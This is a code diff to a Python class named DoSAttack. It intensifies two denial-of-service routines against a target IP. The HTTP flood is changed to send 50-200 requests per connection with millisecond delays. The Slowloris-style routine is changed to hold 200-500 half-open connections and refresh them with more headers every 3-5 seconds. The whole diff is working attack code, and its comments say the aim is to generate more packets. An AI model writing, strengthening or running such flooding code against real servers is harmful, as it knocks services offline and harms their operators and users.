@@ -125,8 +125,8 @@ class DoSAttack:
                 attack_port = random.choice(ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # VARIATION: Variable request size (1-5 requests per connection, weighted to 1)
-                num_reqs = random.choices([1, 2, 3, 4, 5], weights=[70, 15, 10, 3, 2])[0]
+                # INCREASED: 50-200 requests per connection (was 1-5)
+                num_reqs = random.randint(50, 200)
                 
                 for _ in range(num_reqs):
                     path = "/" + _random_string(random.randint(5, 15)) + _random_url_params(random.randint(1, 8))
@@ -145,9 +145,16 @@ class DoSAttack:
                     sock.sendall(headers.encode())
                     self._inc_count()
                     
-                    # VARIATION: Delay between multiple requests in same connection
-                    if num_reqs > 1:
-                        time.sleep(random.uniform(0.01, 0.1))
+                    # Drain response for bidirectional traffic
+                    try:
+                        sock.settimeout(0.05)
+                        sock.recv(4096)
+                    except socket.timeout:
+                        pass
+                    sock.settimeout(5)
+                    
+                    # Minimal delay between requests
+                    time.sleep(random.uniform(0.001, 0.005))
 
                 # Read response briefly then close
                 try:
@@ -177,7 +184,9 @@ class DoSAttack:
         sockets = []
 
         # Phase 1: Open initial batch of sockets with partial headers
-        target_conns = min(150, max(50, self.duration))
+        # INCREASED: 200-500 connections (was 50-150)
+        target_conns = random.randint(200, min(500, self.duration * 5))
+        
         for _ in range(target_conns):
             if not self.running or time.time() >= end_time:
                 break
@@ -197,6 +206,9 @@ class DoSAttack:
                 sock.sendall(partial.encode())
                 sockets.append(sock)
                 self._inc_count()
+                
+                # Slight delay between opening connections
+                time.sleep(random.uniform(0.01, 0.05))
             except Exception:
                 pass
 
@@ -205,11 +217,13 @@ class DoSAttack:
             alive = []
             for sock in sockets:
                 try:
-                    # Send another partial header line to reset server timeout
-                    header_line = f"X-a-{_random_string(4)}: {_random_string(8)}\r\n"
-                    sock.sendall(header_line.encode())
+                    # INCREASED: Send 3-5 header lines per keep-alive (was 1)
+                    for _ in range(random.randint(3, 5)):
+                        header_line = f"X-{_random_string(6)}: {_random_string(16)}\r\n"
+                        sock.sendall(header_line.encode())
+                        self._inc_count()
+                    
                     alive.append(sock)
-                    self._inc_count()
                 except Exception:
                     pass  # Server closed the connection
 
@@ -217,7 +231,7 @@ class DoSAttack:
 
             # Re-open dropped connections to maintain pressure
             deficit = target_conns - len(sockets)
-            for _ in range(max(0, deficit)):
+            for _ in range(max(0, min(20, deficit))):  # Limit re-open rate
                 if not self.running or time.time() >= end_time:
                     break
                 try:
@@ -236,8 +250,8 @@ class DoSAttack:
                 except Exception:
                     pass
 
-            # Wait 10-15 seconds before next keep-alive round (slow is the point)
-            time.sleep(random.uniform(10, 15))
+            # REDUCED WAIT: 3-5 seconds between keep-alive rounds (was 10-15) - generates more packets
+            time.sleep(random.uniform(3, 5))
 
         # Cleanup
         for sock in sockets:
